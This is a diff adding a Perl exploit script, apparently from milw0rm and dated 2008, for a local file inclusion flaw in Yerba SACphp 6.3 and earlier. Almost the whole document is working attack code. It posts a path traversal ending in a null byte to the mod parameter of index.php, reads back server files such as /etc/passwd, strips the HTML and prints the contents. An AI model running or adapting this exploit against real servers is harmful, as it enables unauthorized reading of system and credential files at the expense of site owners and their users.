@@ -1,0 +1,53 @@
+#! /usr/bin/perl
+# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# Yerba SACphp <= 6.3 / Local File Inclusion Exploit
+# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# Program: Yerba SACphp
+# Version: <= 6.3
+# File affected: index.php
+# Download: http://sourceforge.net/projects/yerba/
+#
+#
+# Found by Pepelux <pepelux[at]enye-sec.org>
+# eNYe-Sec - www.enye-sec.org
+#
+# Bug:
+# 37-		include("modulos/$mod/mod_nucleo.php");
+
+
+use LWP::UserAgent;
+use HTTP::Request::Common;
+
+my ($host, $file) = @ARGV ;
+
+unless($ARGV[1]){
+	print "\nUsage: perl $0 <host> <file_to_edit>\n";
+	print "\tex: perl $0 http://localhost /etc/passwd\n\n";
+	exit 1;
+}
+
+$host = 'http://'.$host if ($host !~ /^http:/);
+$host .= "/" if ($host !~ /\/\$/);
+
+my $ua = LWP::UserAgent->new();
+$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1");
+$ua->timeout(10);
+
+my $request = HTTP::Request->new();
+my $response;
+my $url = $host."index.php";
+
+my $req = HTTP::Request->new(POST => $host."index.php");
+$req->content_type('application/x-www-form-urlencoded');
+$req->content("mod=../../../../../".$file."%00");
+
+$request = $ua->request($req);
+$result = $request->content;
+
+$result =~ s/<[^>]*>//g;
+
+print $result . "\n";
+
+exit;
+
+# milw0rm.com [2008-10-06]
